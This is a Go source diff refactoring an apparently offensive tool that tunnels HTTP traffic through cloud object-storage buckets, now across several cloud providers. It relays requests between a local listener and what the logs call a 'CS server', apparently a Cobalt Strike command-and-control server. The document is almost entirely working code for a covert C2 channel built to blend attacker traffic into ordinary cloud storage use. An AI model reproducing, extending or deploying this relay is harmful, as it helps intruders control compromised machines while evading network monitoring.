@@ -1,124 +1,108 @@
 package main
 
-import "C"
 import (
+	"bufio"
 	"bytes"
 	"encoding/base64"
 	"flag"
 	"fmt"
-	"io/ioutil"
+	"io"
 	"log"
 	"net"
 	"os"
 	"strconv"
 	"strings"
+	"sync"
 	"time"
 
-	"github.com/aliyun/aliyun-oss-go-sdk/oss"
 	"github.com/google/uuid"
+
+	"alioss-stinger/storage"
 )
 
-type Client struct {
-	Cli             *oss.Client
-	Bucket          *oss.Bucket
-	Endpoint        string
-	AccessKeyId     string
-	AccessKeySecret string
-	BucketName      string
-}
+var Service storage.Storage
 
-var Service *Client
-
-// var c *oss.Bucket
-
-func InitClient(endPoint, accessKeyId, accessKeySecret, bucketName string) error {
-	var ossClient *oss.Client
-	var err error
-
-	ossClient, err = oss.New(endPoint, accessKeyId, accessKeySecret)
-	if err != nil {
-		return err
-	}
-
-	var ossBucket *oss.Bucket
-	ossBucket, err = ossClient.Bucket(bucketName)
-	if err != nil {
-		return err
-	}
-
-	Service = &Client{
-		Cli:             ossClient,
-		Bucket:          ossBucket,
-		Endpoint:        endPoint,
-		AccessKeyId:     accessKeyId,
-		AccessKeySecret: accessKeySecret,
-		BucketName:      bucketName,
-	}
-	return nil
-}
-
-var server_address string
-var bind_address string
+var (
+	server_address string
+	bind_address   string
+	timeout        = 30
+)
 
 func main() {
-
-	var osskey = flag.String("osskey", "", "format: endpoint:accessKeyId:accessKeySecret:bucketName")
-	var mode = flag.String("mode", "", "client/server 二选一")
-	var address = flag.String("address", "", "监听地址或者目标地址，格式：127.0.0.1:8080")
-	// var proxy = flag.String("proxy", "", "代理服务器上网:http://127.0.0.1:8080,如果有密码:http://x.x.x.x,user,pass")
+	provider := flag.String("provider", "aliyun", "云厂商: aliyun / tencent / aws / huawei / qiniu")
+	osskey := flag.String("osskey", "", "format: endpoint:accessKeyId:accessKeySecret:bucketName[:domain] (domain 仅七牛需要)")
+	mode := flag.String("mode", "", "client/server 二选一")
+	address := flag.String("address", "", "监听地址或者目标地址，格式：127.0.0.1:8080")
 	flag.Parse()
 
-	timeout = 30
-	server_address = *address
-	bind_address = *address
-
-	str1 := strings.Split(*osskey, ":")
-	// str2 := strings.Split(*proxy, ",")
-	// fmt.Println(str2)
-
-	if *mode == "" || *osskey == "" {
+	if *mode == "" || *osskey == "" || *address == "" {
 		flag.PrintDefaults()
 		os.Exit(0)
 	}
 
-	InitClient(str1[0], str1[1], str1[2], str1[3])
+	parts := strings.SplitN(*osskey, ":", 5)
+	if len(parts) < 4 {
+		log.Fatalln("[x]", "osskey 格式错误，需要: endpoint:accessKeyId:accessKeySecret:bucketName[:domain]")
+	}
 
-	if *mode == "client" {
+	cfg := storage.Config{
+		Endpoint:        parts[0],
+		AccessKeyID:     parts[1],
+		AccessKeySecret: parts[2],
+		Bucket:          parts[3],
+	}
+	if len(parts) == 5 {
+		cfg.Domain = parts[4]
+	}
+
+	server_address = *address
+	bind_address = *address
+
+	s, err := storage.New(*provider, cfg)
+	if err != nil {
+		log.Fatalln("[x]", "初始化云存储客户端失败:", err)
+	}
+	Service = s
+	log.Println("[+]", "使用云厂商:", *provider)
+
+	switch *mode {
+	case "client":
 		startClient()
-	} else if *mode == "server" {
+	case "server":
 		startServer()
+	default:
+		flag.PrintDefaults()
+		os.Exit(0)
 	}
 }
 
 func startServer() {
 	log.Println("[+]", "服务端启动成功")
+	var inflight sync.Map
 	for {
-
 		time.Sleep(1 * time.Second)
-		for _, c2 := range List(Service) {
-			if strings.Contains(c2.Key, "client.txt") {
-				go process_server(c2.Key)
+		keys, err := Service.List("", 100)
+		if err != nil {
+			log.Println("[-]", "List 失败:", err)
+			continue
+		}
+		for _, k := range keys {
+			if !strings.Contains(k, "client.txt") {
+				continue
 			}
+			if _, loaded := inflight.LoadOrStore(k, struct{}{}); loaded {
+				continue
+			}
+			go func(key string) {
+				defer inflight.Delete(key)
+				process_server(key)
+			}(k)
 		}
 	}
 }
-func List(c *Client) []oss.ObjectProperties {
-
-	lsRes, err := c.Bucket.ListObjects(oss.MaxKeys(3), oss.Prefix(""))
-	if err != nil {
-		fmt.Println("Error:", err)
-		os.Exit(-1)
-	}
-	// fmt.Println(lsRes)
-	return lsRes.Objects
-
-}
-
-var timeout int
 
 func startClient() {
 	log.Println("[+]", "客户端启动成功")
-
 	server, err := net.Listen("tcp", bind_address)
 	if err != nil {
 		log.Fatalln("[x]", "listen address ["+bind_address+"] faild.")
@@ -134,207 +118,184 @@ func startClient() {
 	}
 }
 
-func process(conn net.Conn) {
-	uuid := uuid.New()
-	key := uuid.String()
-	defer conn.Close() // 关闭连接
-	var buffer bytes.Buffer
-	_ = conn.SetReadDeadline(time.Now().Add(10 * time.Second))
+// readHTTPMessage 读取一个完整的 HTTP 请求或响应的原始字节。
+// 使用 bufio.Reader 以避免逐字节 syscall，并通过 Content-Length / Transfer-Encoding 决定 body 长度。
+func readHTTPMessage(br *bufio.Reader) ([]byte, error) {
+	var buf bytes.Buffer
 	for {
-		var buf [1]byte
-		n, err := conn.Read(buf[:])
+		line, err := br.ReadBytes('\n')
 		if err != nil {
-			log.Println("[-]", uuid, "read from connect failed, err：", err)
-			break
+			return nil, err
 		}
-		buffer.Write(buf[:n])
-		if strings.Contains(buffer.String(), "\r\n\r\n") {
-			//fmt.Println("\n---------DEBUG CLIENT------\n", buffer.String(), "\n----------------------")
-			if strings.Contains(buffer.String(), "Content-Length") {
-
-				ContentLength := buffer.String()[strings.Index(buffer.String(), "Content-Length: ")+len("Content-Length: ") : strings.Index(buffer.String(), "Content-Length: ")+strings.Index(buffer.String()[strings.Index(buffer.String(), "Content-Length: "):], "\n")]
-				log.Println("[+]", uuid, "数据包长度为：", strings.TrimSpace(ContentLength))
-				if strings.TrimSpace(ContentLength) != "0" {
-					intContentLength, err := strconv.Atoi(strings.TrimSpace(ContentLength))
-					if err != nil {
-						log.Println("[-]", uuid, "Content-Length转换失败")
-					}
-
-					for i := 1; i <= intContentLength; i++ {
-						var b [1]byte
-						n, err = conn.Read(b[:])
-						if err != nil {
-							log.Println("[-]", uuid, "read from connect failed, err", err)
-							break
-						}
-						buffer.Write(b[:n])
-					}
-
-				}
-			}
-			if strings.Contains(buffer.String(), "Transfer-Encoding: chunked") {
-				for {
-					var b [1]byte
-					n, err = conn.Read(b[:])
-					if err != nil {
-						log.Println("[-]", uuid, "read from connect failed, err", err)
-						break
-					}
-					buffer.Write(b[:n])
-					if strings.Contains(buffer.String(), "0\r\n\r\n") {
-						break
-					}
-				}
-			}
-			log.Println("[+]", uuid, "从客户端接受HTTP头完毕")
+		buf.Write(line)
+		if bytes.Equal(line, []byte("\r\n")) || bytes.Equal(line, []byte("\n")) {
 			break
 		}
 	}
-	b64 := base64.StdEncoding.EncodeToString(buffer.Bytes())
-	Send(Service, key+"/client.txt", b64)
-	i := 1
-	for {
-		i++
+	header := buf.Bytes()
+	if cl := findHeader(header, "Content-Length"); cl != "" {
+		n, err := strconv.Atoi(strings.TrimSpace(cl))
+		if err != nil {
+			return nil, fmt.Errorf("invalid Content-Length: %q", cl)
+		}
+		if n > 0 {
+			body := make([]byte, n)
+			if _, err := io.ReadFull(br, body); err != nil {
+				return nil, err
+			}
+			buf.Write(body)
+		}
+		return buf.Bytes(), nil
+	}
+	if te := findHeader(header, "Transfer-Encoding"); strings.Contains(strings.ToLower(te), "chunked") {
+		for {
+			line, err := br.ReadBytes('\n')
+			if err != nil {
+				return nil, err
+			}
+			buf.Write(line)
+			sizeStr := strings.TrimRight(strings.TrimRight(string(line), "\n"), "\r")
+			if semi := strings.Index(sizeStr, ";"); semi >= 0 {
+				sizeStr = sizeStr[:semi]
+			}
+			size, err := strconv.ParseInt(strings.TrimSpace(sizeStr), 16, 64)
+			if err != nil {
+				return nil, fmt.Errorf("bad chunk size: %q", sizeStr)
+			}
+			if size == 0 {
+				trailer, err := br.ReadBytes('\n')
+				if err != nil {
+					return nil, err
+				}
+				buf.Write(trailer)
+				return buf.Bytes(), nil
+			}
+			chunk := make([]byte, size+2)
+			if _, err := io.ReadFull(br, chunk); err != nil {
+				return nil, err
+			}
+			buf.Write(chunk)
+		}
+	}
+	return buf.Bytes(), nil
+}
+
+func findHeader(header []byte, name string) string {
+	lowerName := strings.ToLower(name)
+	for _, raw := range bytes.Split(header, []byte("\n")) {
+		line := string(bytes.TrimRight(raw, "\r"))
+		colon := strings.Index(line, ":")
+		if colon < 0 {
+			continue
+		}
+		if strings.ToLower(line[:colon]) == lowerName {
+			return line[colon+1:]
+		}
+	}
+	return ""
+}
+
+func process(conn net.Conn) {
+	id := uuid.New().String()
+	defer conn.Close()
+
+	_ = conn.SetReadDeadline(time.Now().Add(10 * time.Second))
+	br := bufio.NewReader(conn)
+	raw, err := readHTTPMessage(br)
+	if err != nil {
+		log.Println("[-]", id, "读取 HTTP 请求失败:", err)
+		return
+	}
+	log.Println("[+]", id, "从客户端接受 HTTP 请求完毕，长度:", len(raw))
+
+	key := id
+	Send(Service, key+"/client.txt", base64.StdEncoding.EncodeToString(raw))
+
+	for i := 1; ; i++ {
 		time.Sleep(1 * time.Second)
 		if i >= timeout {
-			log.Println("[x]", "超时，断开")
+			log.Println("[x]", id, "超时，断开")
 			Del(Service, key+"/client.txt")
 			return
 		}
 		buff := Get(Service, key+"/server.txt")
-		if buff != nil {
-			log.Println("[x]", uuid, "收到服务器消息")
-			//fmt.Println(buff)
-			Del(Service, key+"/server.txt")
-			sDec, err := base64.StdEncoding.DecodeString(string(buff))
-			//fmt.Println(sDec)
-			if err != nil {
-				log.Println("[x]", uuid, "Base64解码错误")
-				return
-			}
-			conn.Write(sDec)
-			break
+		if buff == nil {
+			continue
 		}
-	}
-	log.Println("[+]", "发送完成")
-}
-
-// // var name string = "1111.txt"
-// // var content string = "测试数据"
-
-func Send(c *Client, name string, content string) {
-
-	// 1.通过字符串上传对象
-	f := strings.NewReader(content)
-	// var err error
-	err := c.Bucket.PutObject(name, f)
-	if err != nil {
-		log.Println("[-]", "上传失败")
+		log.Println("[+]", id, "收到服务器消息")
+		Del(Service, key+"/server.txt")
+		sDec, err := base64.StdEncoding.DecodeString(string(buff))
+		if err != nil {
+			log.Println("[x]", id, "Base64 解码错误:", err)
+			return
+		}
+		if _, err := conn.Write(sDec); err != nil {
+			log.Println("[-]", id, "写回客户端失败:", err)
+			return
+		}
+		log.Println("[+]", id, "发送完成")
 		return
 	}
-
 }
-func Get(c *Client, name string) []byte {
 
-	println(name)
-	body, err := c.Bucket.GetObject(name)
+func Send(s storage.Storage, name, content string) {
+	if err := s.Put(name, []byte(content)); err != nil {
+		log.Println("[-]", "上传失败:", err)
+	}
+}
+
+func Get(s storage.Storage, name string) []byte {
+	data, err := s.Get(name)
 	if err != nil {
 		return nil
 	}
-	// 数据读取完成后，获取的流必须关闭，否则会造成连接泄漏，导致请求无连接可用，程序无法正常工作。
-	defer body.Close()
-	// println(body)
-	data, err := ioutil.ReadAll(body)
-	if err != nil {
-		fmt.Println("Error:", err)
-		os.Exit(-1)
-	}
-	// fmt.Println(data)
 	return data
 }
 
-func Del(c *Client, name string) {
-	err := c.Bucket.DeleteObject(name)
-	if err != nil {
-		panic(err)
+func Del(s storage.Storage, name string) {
+	if err := s.Delete(name); err != nil {
+		log.Println("[-]", "删除对象失败:", name, err)
 	}
-
 }
 
 func process_server(name string) {
+	id := name[:strings.Index(name, "/")]
+	log.Println("[+]", "发现客户端："+id)
 
-	uuid := name[:strings.Index(name, "/")]
-	log.Println("[+]", "发现客户端："+uuid)
 	buff := Get(Service, name)
-	sDec, err := base64.StdEncoding.DecodeString(string(buff))
+	if buff == nil {
+		Del(Service, name)
+		return
+	}
 	Del(Service, name)
-	conn, err := net.Dial("tcp", server_address)
 
+	sDec, err := base64.StdEncoding.DecodeString(string(buff))
 	if err != nil {
-		log.Println("[-]", uuid, "连接CS服务器失败")
+		log.Println("[-]", id, "Base64 解码错误:", err)
+		return
+	}
+
+	conn, err := net.Dial("tcp", server_address)
+	if err != nil {
+		log.Println("[-]", id, "连接 CS 服务器失败:", err)
 		return
 	}
 	defer conn.Close()
-	_, err = conn.Write(sDec)
-	if err != nil {
-		log.Println("[-]", uuid, "无法向CS服务器发送数据包")
+
+	if _, err := conn.Write(sDec); err != nil {
+		log.Println("[-]", id, "无法向 CS 服务器发送数据包:", err)
 		return
 	}
+
 	_ = conn.SetReadDeadline(time.Now().Add(10 * time.Second))
-	var buffer bytes.Buffer
-	for {
-		var buf [1]byte
-		n, err := conn.Read(buf[:])
-		if err != nil {
-			log.Println("[-]", uuid, "read from connect failed, err", err)
-			break
-		}
-		buffer.Write(buf[:n])
-
-		if strings.Contains(buffer.String(), "\r\n\r\n") {
-			//fmt.Println("\n---------DEBUG SERVER------", buffer.String(), "\n----------------------")
-			if strings.Contains(buffer.String(), "Content-Length") {
-				ContentLength := buffer.String()[strings.Index(buffer.String(), "Content-Length: ")+len("Content-Length: ") : strings.Index(buffer.String(), "Content-Length: ")+strings.Index(buffer.String()[strings.Index(buffer.String(), "Content-Length: "):], "\n")]
-				log.Println("[+]", uuid, "数据包长度为：", strings.TrimSpace(ContentLength))
-				if strings.TrimSpace(ContentLength) != "0" {
-					intContentLength, err := strconv.Atoi(strings.TrimSpace(ContentLength))
-					if err != nil {
-						log.Println("[-]", uuid, "Content-Length转换失败")
-					}
-
-					for i := 1; i <= intContentLength; i++ {
-						var b [1]byte
-						n, err = conn.Read(b[:])
-						if err != nil {
-							log.Println("[-]", uuid, "read from connect failed, err", err)
-							break
-						}
-						buffer.Write(b[:n])
-					}
-
-				}
-			}
-			if strings.Contains(buffer.String(), "Transfer-Encoding: chunked") {
-				for {
-					var b [1]byte
-					n, err = conn.Read(b[:])
-					if err != nil {
-						log.Println("[-]", uuid, "read from connect failed, err", err)
-						break
-					}
-					buffer.Write(b[:n])
-					if strings.Contains(buffer.String(), "0\r\n\r\n") {
-						break
-					}
-				}
-			}
-			log.Println("[+]", uuid, "从CS服务器接受完毕")
-			break
-		}
+	br := bufio.NewReader(conn)
+	raw, err := readHTTPMessage(br)
+	if err != nil {
+		log.Println("[-]", id, "读取 CS 响应失败:", err)
+		return
 	}
+	log.Println("[+]", id, "从 CS 服务器接收完毕，长度:", len(raw))
 
-	b64 := base64.StdEncoding.EncodeToString(buffer.Bytes())
-	Send(Service, uuid+"/server.txt", b64)
-	log.Println("[+]", uuid, "服务器数据发送完毕")
-	return
+	Send(Service, id+"/server.txt", base64.StdEncoding.EncodeToString(raw))
+	log.Println("[+]", id, "服务器数据发送完毕")
 }
